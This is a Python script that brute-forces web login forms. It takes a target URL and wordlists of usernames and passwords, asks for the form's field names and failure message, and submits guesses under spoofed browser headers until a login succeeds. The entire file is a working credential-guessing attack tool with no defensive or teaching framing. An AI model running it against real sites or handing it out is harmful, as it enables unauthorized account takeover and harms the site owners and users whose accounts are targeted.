
from argparse import ArgumentParser
from requests import get, Session
from requests.exceptions import RequestException
from os.path import exists, isfile, basename
from sys import exit

# --

def parser():

    p = ArgumentParser(description = None)

    p.add_argument('-t', '--target', required = True, type = str, help = 'Target Address (Example: http://192.168.0.31/)')
    p.add_argument('-l', '--default-login', type = str, help = 'Default Login'),
    p.add_argument('-L', '--login-list', type = str, help = 'Login Wordlist'),
    p.add_argument('-p', '--default-password', type = str, help = 'Default Password'),
    p.add_argument('-P', '--password-list', type = str, help = 'Password Wordlist')

    arguments = p.parse_args()

    return (
        arguments.target, 
        arguments.default_login, 
        arguments.login_list, 
        arguments.default_password, 
        arguments.password_list
    )

# --

def check_target_host(target_host):

    basic_headers = { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", }

    try:

        req = get(target_host, headers = basic_headers)

    except (RequestException) as request_exception:

        exit(f'[x] Error: Failed to check the target host | Exception: {str(request_exception)}')

# --

def validate_wordlists(login_wordlist, password_wordlist):

    wl_failed = True

    for _list_ in [login_wordlist, password_wordlist]:
        if (_list_ is not None):

            if ((exists(_list_) is False) or (isfile(_list_) is False)):

                print(f'[x] Error: Invalid Wordlist File > {str(basename(_list_))}')

                wl_failed = False

    if (wl_failed is False): exit()

# --

def get_attack_type(default_login, login_wordlist, default_password, password_wordlist):

    attack_type = None

    if ((default_login is not None) and (login_wordlist is None) and (default_password is None) and (password_wordlist is not None)):

        attack_type = '1:with_password_wordlist'

    if ((default_password is not None) and (password_wordlist is None) and (default_login is None) and (login_wordlist) is not None):

        attack_type = '2:with_login_wordlist'

    if ((default_login is None) and (login_wordlist is not None) and (default_password is None) and (password_wordlist is not None)):

        attack_type = '3:with_both_wordlists'

    if (attack_type is None):

        exit('[x] Invalid List Attack Format')

    return attack_type

# --

def define_additional_attack_parameters():

    while (True):
        try:

            additional_attack_parameter_login_route = str(input('(Additional Attack Parameter) Login Route: '))

            additional_attack_parameter_login_input_name = str(input('(Additional Attack Parameter) Login Input Name: '))
            additional_attack_parameter_passw_input_name = str(input('(Additional Attack Parameter) Passw Input Name: '))

            additional_attack_parameter_login_error_message = str(input('(Additional Attack Parameter) Invalid Data Default Error Message: '))

            break

        except (ValueError) as value_error:

            print(f'[x] Error: Failed to get info, Value Error | Exception: {str(value_error)}')

        except (KeyboardInterrupt): exit('\n')

    return (
        additional_attack_parameter_login_route,
        additional_attack_parameter_login_input_name,
        additional_attack_parameter_passw_input_name,
        additional_attack_parameter_login_error_message
    )

# --

class attack:

    def __init__(self, attack_obj, attack_type):

        self.attack_obj = attack_obj
        self.attack_type = attack_type

        self.request_session_headers = {

            'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' 'AppleWebKit/537.36 (KHTML, like Gecko) ' 'Chrome/131.0.0.0 Safari/537.36'),

            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            
        }

        if (self.attack_type == '1:with_password_wordlist'):

            self.with_password_wordlist()

        if (self.attack_type == '2:with_login_wordlist'):

            self.with_login_wordlist()

        if (self.attack_type == '3:with_both_wordlists'):

            self.with_both_wordlists()

    def with_password_wordlist(self):

        with open (self.attack_obj['password_list'], 'r', encoding = 'utf-8') as r:
            for password in r.readlines():

                authentication = self.test_credentials(self.attack_obj['default_login'], str(password.strip('\n')))

                if (authentication is False): continue

                self.success(self.attack_obj['default_login'], str(password.strip('\n')))

                break

    def with_login_wordlist(self):

        with open (self.attack_obj['login_list'], 'r', encoding = 'utf-8') as r:
            for login in r.readlines():

                authentication = self.test_credentials(str(login.strip('\n')), self.attack_obj['default_password'])

                if (authentication is False): continue

                self.success(str(login.strip('\n')), self.attack_obj['default_password'])

                break

    def with_both_wordlists(self):

        with open (self.attack_obj['login_list'], 'r', encoding = 'utf-8') as r:
            for login in r.readlines():

                with open(self.attack_obj['password_list'], 'r', encoding = 'utf-8') as r:
                    for password in r.readlines():

                        authentication = self.test_credentials(str(login.strip('\n')), str(password.strip('\n')))

                        if (authentication is False): continue

                        self.success(str(login.strip('\n')), str(password.strip('\n')))

                        break

    def test_credentials(self, login, password):

        with Session() as session:
            session.headers.update(self.request_session_headers)

            full_post_url = '%s%s' % (self.attack_obj['target'], self.attack_obj['additional']['login_route'])

            payload = { 
                self.attack_obj['additional']['login_input_name']: login, self.attack_obj['additional']['passw_input_name']: password, 'submit_button': True
            }

            print('* Testing %s || %s' % (full_post_url, payload))

            response = session.post(full_post_url, data = payload)
            response.raise_for_status()

            text = response.text

            if (self.attack_obj['additional']['login_error_message'] in str(text)): return False
        
        return True

    def success(self, login, password):

        print('\n' + ('-' * 50) + '\n')
        print(f'[+ Success + ] Login: {str(login)} - Password: {str(password)}')

# --

if (__name__ == '__main__'):

    (TARGET, DEFAULT_LOGIN, LOGIN_LIST, DEFAULT_PASSWORD, PASSWORD_LIST) = parser()

    check_target_host(TARGET)
    validate_wordlists(LOGIN_LIST, PASSWORD_LIST)

    ATTACK_TYPE = get_attack_type(DEFAULT_LOGIN, LOGIN_LIST, DEFAULT_PASSWORD, PASSWORD_LIST)

    (LOGIN_ROUTE, LOGIN_INPUT_NAME, PASSW_INPUT_NAME, LOGIN_ERROR_MESSAGE) = define_additional_attack_parameters()

    attack_obj = {
        'target': TARGET, 
        'default_login': DEFAULT_LOGIN, 
        'login_list': LOGIN_LIST, 
        'default_password': DEFAULT_PASSWORD, 
        'password_list': PASSWORD_LIST,

        'additional': {

            'login_route': LOGIN_ROUTE,
            'login_input_name': LOGIN_INPUT_NAME,
            'passw_input_name': PASSW_INPUT_NAME,
            'login_error_message': LOGIN_ERROR_MESSAGE

        }
    }

    attack(attack_obj, ATTACK_TYPE)